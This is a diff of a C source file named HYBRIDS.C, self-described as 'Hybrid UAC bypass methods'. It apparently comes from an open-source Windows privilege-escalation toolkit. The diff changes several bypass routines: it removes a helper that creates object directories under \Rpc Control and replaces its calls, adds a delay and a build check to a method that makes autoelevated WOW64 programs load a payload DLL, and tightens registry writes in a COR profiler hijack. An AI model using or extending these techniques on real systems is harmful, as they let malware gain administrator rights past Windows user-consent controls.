@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.78
+*  VERSION:     2.80
 *
-*  DATE:        30 July 2017
+*  DATE:        07 Sept 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1275,76 +1275,6 @@ BOOL ucmInetMgrMethod(
 }
 
 /*
-* ucmSetupAkagiLink
-*
-* Purpose:
-*
-* Give Ikazuchi proper key to work with.
-*
-*/
-BOOL ucmSetupAkagiLink(
-    VOID
-)
-{
-    BOOL bCond = FALSE, bResult = FALSE;
-    HANDLE hRoot = NULL, hChild = NULL;
-    LPWSTR lpUser;
-    NTSTATUS status;
-    UNICODE_STRING ChildName, ParentRoot, usKey;
-    OBJECT_ATTRIBUTES attr;
-
-    RtlSecureZeroMemory(&usKey, sizeof(usKey));
-
-    do {
-        status = RtlFormatCurrentUserKeyPath(&usKey);
-        if (!NT_SUCCESS(status))
-            break;
-
-        lpUser = _filename(usKey.Buffer);
-
-        ParentRoot.Buffer = NULL;
-        ParentRoot.Length = 0;
-        ParentRoot.MaximumLength = 0;
-        RtlInitUnicodeString(&ParentRoot, L"\\Rpc Control\\Akagi");
-        InitializeObjectAttributes(&attr, &ParentRoot, OBJ_CASE_INSENSITIVE, 0, NULL);
-        status = NtCreateDirectoryObject(&hRoot, DIRECTORY_CREATE_SUBDIRECTORY, &attr);
-        if (!NT_SUCCESS(status))
-            break;
-
-        ChildName.Buffer = NULL;
-        ChildName.Length = 0;
-        ChildName.MaximumLength = 0;
-        RtlInitUnicodeString(&ChildName, lpUser);
-        attr.RootDirectory = hRoot;
-        attr.ObjectName = &ChildName;
-        status = NtCreateDirectoryObject(&hChild, DIRECTORY_ALL_ACCESS, &attr);
-        if (!NT_SUCCESS(status))
-            break;
-
-        bResult = TRUE;
-
-    } while (bCond);
-
-    //
-    // Cleanup created objects if something went wrong.
-    // Otherwise objects will die together with process at exit.
-    //
-    if (bResult == FALSE) {
-        if (hRoot) {
-            NtClose(hRoot);
-        }
-        if (hChild) {
-            NtClose(hChild);
-        }
-    }
-
-    if (usKey.Buffer) {
-        RtlFreeUnicodeString(&usKey);
-    }
-    return bResult;
-}
-
-/*
 * ucmSXSMethod
 *
 * Purpose:
@@ -1475,7 +1405,7 @@ BOOL ucmSXSMethod(
                 break;
 
             //put a link to Ikazuchi, so she can find proper key.
-            ucmSetupAkagiLink();
+            supSetupIPCLinkData();
         }
 
         //run target process
@@ -1587,6 +1517,10 @@ BOOL ucmWow64LoggerMethod(
     BOOL bResult = FALSE;
     WCHAR szTarget[MAX_PATH * 2];
 
+    if (g_ctx.dwBuildNumber > 15063) {
+        supSetupIPCLinkData();
+    }
+
     //
     // Build target application full path.
     // We need autoelevated application from syswow64 folder ONLY.
@@ -1597,6 +1531,9 @@ BOOL ucmWow64LoggerMethod(
 
     bResult = ucmGenericAutoelevation(szTarget, WOW64LOG_DLL, ProxyDll, ProxyDllSize);
     if (bResult) {
+
+        Sleep(5000);
+
         //
         // Attempt to remove payload dll after execution.
         // Warning: every wow64 application will load payload code (some will crash).
@@ -2083,16 +2020,20 @@ BOOL ucmMethodCorProfiler(
                     (BYTE*)szBuffer,
                     (DWORD)sz);
 
-                RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
-                _strcpy(szRegBuffer, T_APARTMENT);
-                sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
-                lResult = RegSetValueEx(
-                    hKey,
-                    T_THREADINGMODEL,
-                    0,
-                    REG_SZ,
-                    (BYTE*)szRegBuffer,
-                    (DWORD)sz);
+                if (lResult == ERROR_SUCCESS) {
+
+                    RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
+                    _strcpy(szRegBuffer, T_APARTMENT);
+                    sz = (1 + _strlen(szRegBuffer)) * sizeof(WCHAR);
+                    RegSetValueEx(
+                        hKey,
+                        T_THREADINGMODEL,
+                        0,
+                        REG_SZ,
+                        (BYTE*)szRegBuffer,
+                        (DWORD)sz);
+
+                }
 
                 RegCloseKey(hKey);
             }
